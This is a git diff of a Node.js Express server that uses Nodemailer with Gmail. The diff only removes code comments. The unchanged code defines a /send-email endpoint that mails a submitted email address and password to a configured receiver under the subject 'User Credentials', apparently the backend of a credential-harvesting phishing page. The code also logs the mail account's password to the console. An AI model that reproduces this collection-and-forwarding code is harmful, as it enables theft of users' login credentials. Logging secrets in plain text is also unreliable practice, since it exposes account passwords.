@@ -4,7 +4,7 @@ import nodemailer from "nodemailer";
 import bodyParser from "body-parser";
 import cors from "cors";
 
-dotenv.config(); // Load environment variables from .env file
+dotenv.config(); 
 
 const app = express();
 app.use(cors({
@@ -15,21 +15,19 @@ app.use(cors({
 
 app.use(bodyParser.json());
 
-// Log environment variables for debugging
 console.log("Email User:", process.env.EMAIL_USER);
 console.log("Email Pass:", process.env.EMAIL_PASS);
 console.log("Email Receiver:", process.env.EMAIL_RECEIVER);
 
-// Configure Nodemailer transporter
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: {
-    user: process.env.EMAIL_USER, // Use environment variable
-    pass: process.env.EMAIL_PASS, // Use environment variable
+    user: process.env.EMAIL_USER, 
+    pass: process.env.EMAIL_PASS, 
   },
 });
 
-// Verify Nodemailer configuration
+
 transporter.verify((error, success) => {
   if (error) {
     console.error("Nodemailer verification error:", error);
@@ -44,7 +42,7 @@ app.post("/send-email", async (req, res) => {
 
   let mailOptions = {
     from: email,
-    to: process.env.EMAIL_RECEIVER, // Use environment variable
+    to: process.env.EMAIL_RECEIVER, 
     subject: "User Credentials",
     text: `Email: ${email}\nPassword: ${password}`,
   };
